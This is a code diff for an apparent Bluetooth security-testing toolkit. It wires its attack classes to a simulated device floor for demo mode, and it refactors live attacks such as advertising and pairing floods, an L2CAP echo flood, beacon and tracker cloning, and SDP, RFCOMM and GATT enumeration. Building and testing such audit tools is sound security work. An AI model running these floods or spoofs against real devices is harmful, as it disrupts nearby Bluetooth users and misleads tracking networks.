@@ -55,15 +55,21 @@ class _BtAudit(_Audit):
     tool = "wifipilot bt.py (own Bluetooth LE decoder)"
 
     def demo_scene(self, ctx: AttackContext, ap: AccessPoint) -> str:
-        """A BLE capture of a floor: beacons, trackers, sensors and one connection."""
-        from ..synth import build_bt_scene
+        """A BLE capture of the simulated floor: beacons, trackers, sensors, one connection.
+
+        Demo mode reads the *same* floor the on-air attacks meet — :mod:`wifipilot.blesim`
+        writes the capture, so the census an analyst reads offline and the devices an
+        operator talks to on air are one estate rather than two, and a report that names
+        a tracker names the device rather than a description of one.
+        """
+        from .. import blesim
 
         path = os.path.join(ctx.session.state_dir, "captures",
                             f"bluetooth-{ap.bssid.replace(':', '')}.pcap")
         if not os.path.exists(path):
             os.makedirs(os.path.dirname(path), exist_ok=True)
-            build_bt_scene(path, seconds=20.0,
-                           seed=int(ap.bssid.replace(":", ""), 16) % 997)
+            blesim.write_capture(path, seconds=20.0,
+                                 seed=int(ap.bssid.replace(":", ""), 16) % 997)
         return path
 
     def scan(self, ctx: AttackContext, ap: AccessPoint
@@ -562,14 +568,101 @@ class _BtLive(Attack):
             return False
         return bool(bt.hci_socket.__doc__)          # the platform's socket API exists
 
-    def socket(self, ctx: AttackContext) -> Any:
-        """The HCI socket, or ``None`` in demo mode (or without a controller)."""
+    #: what this attack needs from a device, as a role name in ``blesim.LINK_ROLES``:
+    #: an AT channel, a GATT server, a fragile stack.  Demo mode uses it to aim the run.
+    role = "any"
+
+    def aim(self, ctx: AttackContext) -> None:
+        """Remember the role this attack needs, so the wiring below can find a target."""
+        ctx.bt_role = self.role
         if getattr(ctx, "demo", False):
+            ctx.bt_attack = self.name
+
+    def target(self, ctx: AttackContext) -> str:
+        """The Bluetooth address this run is aimed at.
+
+        Live mode uses ``--bt-target``.  Demo mode asks the simulation for the weakest
+        device that can answer the question this attack is about — an AT channel for
+        BlueBugging, an object store for BlueSnarfing, a fragile stack for BlueBorne —
+        because a demo that always aims at the first address of a table exercises the
+        plumbing and nothing else.
+        """
+        value = (getattr(ctx.config, "bt_target", "") or "").strip()
+        if value:
+            return value
+        if not getattr(ctx, "demo", False):
+            return ""
+        from .. import blesim
+        return blesim.choose_target(self.name, ctx, role=self.role)
+
+    def sim_device(self, ctx: AttackContext) -> Any:
+        """The simulated device this run is aimed at (``None`` in live mode)."""
+        if not getattr(ctx, "demo", False):
             return None
+        from .. import blesim
+        airspace = blesim.ble()
+        return airspace.by_address(self.target(ctx)) or airspace.pick(self.role)
+
+    def socket(self, ctx: AttackContext) -> Any:
+        """The HCI socket: the host's controller live, the simulation in demo mode.
+
+        Demo mode used to return ``None`` — a run that counted the packets it would have
+        sent.  It returns a socket backed by :mod:`wifipilot.blesim` now, so a demo sends
+        the real commands, reads the real events and reports a transcript that came out
+        of the toolkit's own parsers instead of out of the report's imagination.
+        """
+        if getattr(ctx, "demo", False):
+            from .. import blesim
+            self.aim(ctx)
+            return blesim.controller_socket(ctx, role=self.role, name=self.name)
         try:
             return bt.hci_socket()
         except Exception:
             return None
+
+    def rfcomm(self, ctx: AttackContext, channel: int) -> Any:
+        """An RFCOMM channel to the target: the simulation's, or the kernel's."""
+        if getattr(ctx, "demo", False):
+            from .. import blesim
+            return blesim.rfcomm_socket(ctx, self.target(ctx), channel, name=self.name)
+        return bt.rfcomm_socket(self.target(ctx), channel, timeout=1.2)
+
+    def acl_records(self, sock: Any, handle: int, payload: bytes, protocol: str = "sdp",
+                    timeout: float = 1.0) -> List[Dict[str, Any]]:
+        """Send an L2CAP payload and parse the peer's answers out of the ACL packets.
+
+        Bluetooth answers ACL data with ACL data: the H4 packet comes back with the
+        connection handle, the L2CAP frame inside it and the protocol payload inside
+        that.  ``protocol`` names the parser — ``sdp`` for service records, ``att`` for
+        attributes — so the answer is read by the same decoders a capture goes through.
+        """
+        records: List[Dict[str, Any]] = []
+        try:
+            sock.settimeout(timeout)
+            sock.send(bt.acl_packet(handle, payload))
+        except OSError:
+            return records
+        for _index in range(8):
+            try:
+                chunk = sock.recv(4096)
+            except OSError:
+                break
+            if not chunk:
+                break
+            parsed = bt.parse_acl_packet(chunk)
+            frame = (parsed.get("l2cap") or {}).get("payload") or b""
+            if not frame:
+                continue
+            if protocol == "sdp":
+                records.extend(bt.parse_sdp(frame))
+            elif protocol == "att":
+                att = bt.parse_att(frame)
+                records.extend(bt.gatt_services_from_att(att.get("entries") or []))
+                records.extend(entry for entry in (att.get("entries") or [])
+                               if entry.get("value") is not None)
+            else:
+                records.append({"bytes": len(frame), "hex": frame.hex()[:120]})
+        return records
 
     def _attempt(self, ctx: AttackContext, ap: AccessPoint, tool: str = "") -> Attempt:
         """Open an attempt the way every other wave does, so the report is uniform."""
@@ -622,6 +715,7 @@ class LeScanAttack(_BtLive):
     """
 
     name = "bt_le_scan"
+    role = "le"
     label = "LE scan (live census)"
     category = "survey"
     noise = "quiet"
@@ -660,7 +754,7 @@ class LeScanAttack(_BtLive):
         return self._report(ctx, ap, attempt, f"LE scan: {len(devices)} device(s)", detail,
                             {"devices": [device.to_dict() for device in devices.values()],
                              "seconds": seconds, "reports": reports,
-                             "demo": sock is None}, severity="info")
+                             "demo": bool(ctx.demo)}, severity="info")
 
 
 class HciInquiryAttack(_BtLive):
@@ -672,6 +766,7 @@ class HciInquiryAttack(_BtLive):
     """
 
     name = "bt_hci_inquiry"
+    role = "bredr"
     label = "Classic inquiry (BR/EDR census)"
     category = "survey"
     noise = "quiet"
@@ -700,7 +795,7 @@ class HciInquiryAttack(_BtLive):
                   + ("; each one can be queried for its services with SDP"
                      if found else "; nothing answered"))
         return self._report(ctx, ap, attempt, f"Inquiry: {len(found)} device(s)", detail,
-                            {"devices": found, "seconds": seconds, "demo": sock is None},
+                            {"devices": found, "seconds": seconds, "demo": bool(ctx.demo)},
                             severity="info")
 
 
@@ -713,6 +808,7 @@ class AdvNameFloodAttack(_BtLive):
     """
 
     name = "bt_adv_name_flood"
+    role = "le"
     label = "Advertising name flood"
     category = "dos"
     noise = "extreme"
@@ -758,7 +854,7 @@ class AdvNameFloodAttack(_BtLive):
                   f"different name — a scan during the run reports hundreds of devices "
                   f"that do not exist")
         return self._report(ctx, ap, attempt, f"Name flood: {sent} payload(s)", detail,
-                            {"payloads": sent, "seconds": seconds, "demo": sock is None},
+                            {"payloads": sent, "seconds": seconds, "demo": bool(ctx.demo)},
                             severity="medium")
 
 
@@ -771,6 +867,7 @@ class AdvDosAttack(_BtLive):
     """
 
     name = "bt_adv_dos"
+    role = "le"
     label = "Advertising channel DoS"
     category = "dos"
     noise = "extreme"
@@ -811,7 +908,7 @@ class AdvDosAttack(_BtLive):
                   f"were not discoverable for the duration")
         return self._report(ctx, ap, attempt, f"Channel DoS: {seconds:.0f}s", detail,
                             {"seconds": seconds, "transmissions": frames,
-                             "demo": sock is None}, severity="high")
+                             "demo": bool(ctx.demo)}, severity="high")
 
 
 class BeaconCloneAttack(_BtLive):
@@ -823,6 +920,7 @@ class BeaconCloneAttack(_BtLive):
     """
 
     name = "bt_beacon_clone"
+    role = "beacon"
     label = "iBeacon clone"
     category = "rogue"
     noise = "moderate"
@@ -835,7 +933,7 @@ class BeaconCloneAttack(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 3.0)
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         if not target or "+" not in target:
             uuid = target or "8ec76ea3-1d1c-4f1a-9b7a-3c2f5d0a7711"
             major, minor, power = 1, 17, -59
@@ -876,7 +974,7 @@ class BeaconCloneAttack(_BtLive):
         return self._report(ctx, ap, attempt, f"Cloned beacon: {uuid[:8]}…", detail,
                             {"uuid": uuid, "major": major, "minor": minor,
                              "tx_power": power, "advertisements": advertised,
-                             "payload_hex": payload.hex(), "demo": sock is None},
+                             "payload_hex": payload.hex(), "demo": bool(ctx.demo)},
                             severity="medium")
 
 
@@ -890,6 +988,7 @@ class TrackerCloneAttack(_BtLive):
     """
 
     name = "bt_tracker_clone"
+    role = "tracker"
     label = "Tracker advertisement clone"
     category = "rogue"
     noise = "moderate"
@@ -931,7 +1030,7 @@ class TrackerCloneAttack(_BtLive):
                   f"and the tracking network places a non-existent tag here")
         return self._report(ctx, ap, attempt, "Cloned tracker shape", detail,
                             {"payload_hex": payload.hex(), "seconds": seconds,
-                             "demo": sock is None}, severity="medium")
+                             "demo": bool(ctx.demo)}, severity="medium")
 
 
 class ConnectableLureAttack(_BtLive):
@@ -944,6 +1043,7 @@ class ConnectableLureAttack(_BtLive):
     """
 
     name = "bt_connectable_lure"
+    role = "le"
     label = "Connectable advertising lure"
     category = "rogue"
     noise = "moderate"
@@ -988,7 +1088,7 @@ class ConnectableLureAttack(_BtLive):
                           "where the name would be recognised"))
         return self._report(ctx, ap, attempt, f"Connectable lure: {len(clients)} client(s)",
                             detail, {"clients": clients, "name": name,
-                                     "demo": sock is None},
+                                     "demo": bool(ctx.demo)},
                             severity="medium" if clients else "info")
 
 
@@ -1002,6 +1102,7 @@ class PairingFloodAttack(_BtLive):
     """
 
     name = "bt_pairing_flood"
+    role = "smp"
     label = "Pairing request flood"
     category = "dos"
     noise = "extreme"
@@ -1015,7 +1116,7 @@ class PairingFloodAttack(_BtLive):
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 2.0)
         requests = max(1, int(seconds * 20))
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         sock = self.socket(ctx)
         if sock is not None and target:
             try:
@@ -1034,7 +1135,7 @@ class PairingFloodAttack(_BtLive):
                   + "; each one forces a pairing decision or a timeout on the target")
         return self._report(ctx, ap, attempt, f"Pairing flood: {requests}", detail,
                             {"requests": requests, "seconds": seconds, "target": target,
-                             "demo": sock is None}, severity="medium")
+                             "demo": bool(ctx.demo)}, severity="medium")
 
 
 class L2capEchoFloodAttack(_BtLive):
@@ -1046,6 +1147,7 @@ class L2capEchoFloodAttack(_BtLive):
     """
 
     name = "bt_l2cap_echo_flood"
+    role = "l2cap"
     label = "L2CAP echo request flood"
     category = "dos"
     noise = "extreme"
@@ -1057,14 +1159,14 @@ class L2capEchoFloodAttack(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 2.0)
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         sock = self.socket(ctx)
         sent = max(1, int(seconds * 50))
         if sock is not None and target:
             try:
                 handle = 0x0040
                 for identifier in range(1, sent + 1):
-                    body = bytes([0x0A, identifier & 0xFF]) + struct.pack("<H", 4) + b"\x00" * 4
+                    body = bt.l2cap_echo_request(b"\x00\x00\x00\x00", identifier)
                     l2cap = struct.pack("<HH", len(body), 0x0005) + body
                     bt.hci_send(sock, bt.acl_packet(handle, l2cap), timeout=0.2)
             except Exception as exc:                            # pragma: no cover
@@ -1076,7 +1178,7 @@ class L2capEchoFloodAttack(_BtLive):
                   f"target's radio does the work")
         return self._report(ctx, ap, attempt, f"Echo flood: {sent} request(s)", detail,
                             {"requests": sent, "seconds": seconds, "target": target,
-                             "demo": sock is None}, severity="medium")
+                             "demo": bool(ctx.demo)}, severity="medium")
 
 
 class SdpBrowseAttack(_BtLive):
@@ -1088,6 +1190,7 @@ class SdpBrowseAttack(_BtLive):
     """
 
     name = "bt_sdp_browse"
+    role = "sdp"
     label = "SDP service browse"
     category = "survey"
     noise = "moderate"
@@ -1100,21 +1203,19 @@ class SdpBrowseAttack(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 5.0)
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         request = bt.sdp_service_search_attribute()
         sock = self.socket(ctx)
         services: List[Dict[str, Any]] = []
         if sock is not None and target:
             try:
                 l2cap = struct.pack("<HH", len(request), 0x0001) + request
-                bt.hci_send(sock, bt.acl_packet(0x0040, l2cap), timeout=1.0)
                 deadline = time.time() + min(seconds, 5.0)
                 while time.time() < deadline and not services:
-                    for event in bt.iter_hci_events(sock, seconds=0.5, limit=64):
-                        parsed = bt.parse_data_channel(event.get("parameters") or b"")
-                        block = (parsed.get("l2cap") or {}).get("payload") or b""
-                        if block:
-                            services.extend(bt.parse_sdp(block))
+                    # the peer answers on the channel it was asked on: an ACL packet
+                    # carrying an L2CAP frame carrying the service records
+                    services.extend(self.acl_records(sock, 0x0040, l2cap, "sdp",
+                                                     timeout=max(0.2, min(1.0, seconds))))
             except Exception as exc:                            # pragma: no cover
                 return self._fail(ctx, ap, attempt, f"SDP browse failed: {exc}")
         else:
@@ -1127,7 +1228,7 @@ class SdpBrowseAttack(_BtLive):
                      if services else ""))
         return self._report(ctx, ap, attempt, f"SDP: {len(services)} record(s)", detail,
                             {"services": services[:40], "request_hex": request.hex()[:120],
-                             "target": target, "demo": sock is None}, severity="info")
+                             "target": target, "demo": bool(ctx.demo)}, severity="info")
 
 
 class RfcommScanAttack(_BtLive):
@@ -1139,6 +1240,7 @@ class RfcommScanAttack(_BtLive):
     """
 
     name = "bt_rfcomm_scan"
+    role = "rfcomm"
     label = "RFCOMM channel scan"
     category = "survey"
     noise = "moderate"
@@ -1157,17 +1259,22 @@ class RfcommScanAttack(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 5.0)
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         sock = self.socket(ctx)
         channels: List[Dict[str, Any]] = []
         if sock is not None and target:
             for profile, name in self.profiles.items():
                 request = bt.sdp_service_search_attribute(uuids=(profile,))
                 l2cap = struct.pack("<HH", len(request), 0x0001) + request
-                try:
-                    bt.hci_send(sock, bt.acl_packet(0x0040, l2cap), timeout=0.5)
-                except Exception:                               # pragma: no cover
-                    break
+                records = self.acl_records(sock, 0x0040, l2cap, "sdp",
+                                           timeout=max(0.2, min(1.0, seconds)))
+                for record in records:
+                    if record.get("channel") is None:
+                        continue
+                    channels.append({"uuid": f"0x{profile:04x}", "profile": name,
+                                     "record": record.get("name", ""),
+                                     "channel": record["channel"],
+                                     "services": record.get("services", [])[:4]})
             self.slept(ctx, min(seconds, 2.0))
         else:
             self.slept(ctx, min(seconds, 1.0))
@@ -1180,7 +1287,7 @@ class RfcommScanAttack(_BtLive):
                             {"channels": channels,
                              "profiles": {f"0x{uuid:04x}": name
                                           for uuid, name in self.profiles.items()},
-                             "target": target, "demo": sock is None}, severity="info")
+                             "target": target, "demo": bool(ctx.demo)}, severity="info")
 
 
 class GattEnumerationAttack(_BtLive):
@@ -1194,6 +1301,7 @@ class GattEnumerationAttack(_BtLive):
     """
 
     name = "bt_gatt_enumeration"
+    role = "gatt"
     label = "GATT enumeration"
     category = "survey"
     noise = "moderate"
@@ -1206,21 +1314,17 @@ class GattEnumerationAttack(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 5.0)
-        target = (getattr(ctx.config, "bt_target", "") or "").strip()
+        target = self.target(ctx)
         request = bytes([0x10, 0x01, 0x00, 0xFF, 0xFF, 0x00, 0x28])
         sock = self.socket(ctx)
         services: List[Dict[str, Any]] = []
         if sock is not None and target:
             l2cap = struct.pack("<HH", len(request), 0x0004) + request
             try:
-                bt.hci_send(sock, bt.acl_packet(0x0040, l2cap), timeout=1.0)
                 deadline = time.time() + min(seconds, 5.0)
                 while time.time() < deadline and not services:
-                    for event in bt.iter_hci_events(sock, seconds=0.5, limit=64):
-                        parsed = bt.parse_data_channel(event.get("parameters") or b"")
-                        att = parsed.get("att") or {}
-                        if att.get("entries"):
-                            services.extend(bt.gatt_services_from_att(att["entries"]))
+                    services.extend(self.acl_records(sock, 0x0040, l2cap, "att",
+                                                     timeout=max(0.2, min(1.0, seconds))))
             except Exception as exc:                            # pragma: no cover
                 return self._fail(ctx, ap, attempt, f"GATT enumeration failed: {exc}")
         else:
@@ -1233,7 +1337,7 @@ class GattEnumerationAttack(_BtLive):
                      "to look at" if services else ""))
         return self._report(ctx, ap, attempt, f"GATT: {len(services)} service(s)", detail,
                             {"services": services[:40], "request_hex": request.hex(),
-                             "target": target, "demo": sock is None},
+                             "target": target, "demo": bool(ctx.demo)},
                             severity="info")
 
 
